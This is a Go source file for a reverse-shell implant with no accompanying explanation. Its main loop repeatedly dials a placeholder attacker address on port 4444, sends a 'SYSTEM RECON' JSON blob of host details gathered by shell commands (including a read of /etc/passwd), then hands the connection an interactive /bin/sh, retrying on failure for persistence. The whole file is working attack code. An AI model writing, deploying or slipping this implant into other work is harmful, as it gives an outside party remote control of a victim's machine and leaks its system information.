package main

import (
    "encoding/json"
    "fmt"
    "io"
    "net"
    "os"
    "os/exec"
    "runtime"
    "time"
)

type SystemInfo struct {
    Hostname    string            `json:"hostname"`
    OS          string            `json:"os"`
    Arch        string            `json:"arch"`
    CPU         int               `json:"cpu_cores"`
    Memory      string            `json:"memory_info"`
    IP          string            `json:"local_ip"`
    Users       []string          `json:"users"`
    Processes   int               `json:"process_count"`
    NetworkInfo map[string]string `json:"network_interfaces"`
}

func getSystemInfo() SystemInfo {
    hostname, _ := os.Hostname()
    
    // Get memory info
    memCmd := exec.Command("sh", "-c", "free -h | awk 'NR==2{print $2}'")
    memOut, _ := memCmd.Output()
    
    // Get local IP
    conn, _ := net.Dial("udp", "8.8.8.8:80")
    localIP := "unknown"
    if conn != nil {
        localIP = conn.LocalAddr().(*net.UDPAddr).IP.String()
        conn.Close()
    }
    
    // Get user list
    userCmd := exec.Command("sh", "-c", "cut -d: -f1 /etc/passwd")
    userOut, _ := userCmd.Output()
    users := []string{}
    if len(userOut) > 0 {
        users = []string{"Extracted user list available"}
    }
    
    // Get process count
    procCmd := exec.Command("sh", "-c", "ps aux | wc -l")
    procOut, _ := procCmd.Output()
    procCount := 0
    fmt.Sscanf(string(procOut), "%d", &procCount)
    
    return SystemInfo{
        Hostname:  hostname,
        OS:        runtime.GOOS,
        Arch:      runtime.GOARCH,
        CPU:       runtime.NumCPU(),
        Memory:    string(memOut),
        IP:        localIP,
        Users:     users,
        Processes: procCount,
    }
}

func reverseShell(conn net.Conn) {
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}

func main() {
    // Your attacker machine IP and port
    attacker := "YOUR_ATTACKER_IP:4444"
    
    for {
        conn, err := net.Dial("tcp", attacker)
        if err != nil {
            time.Sleep(30 * time.Second)
            continue
        }
        
        // Send system info first
        info := getSystemInfo()
        jsonData, _ := json.Marshal(info)
        conn.Write([]byte("=== SYSTEM RECON ===\n"))
        conn.Write(jsonData)
        conn.Write([]byte("\n=== SHELL ACCESS ===\n"))
        
        // Start reverse shell
        reverseShell(conn)
        conn.Close()
        time.Sleep(10 * time.Second)
    }
}
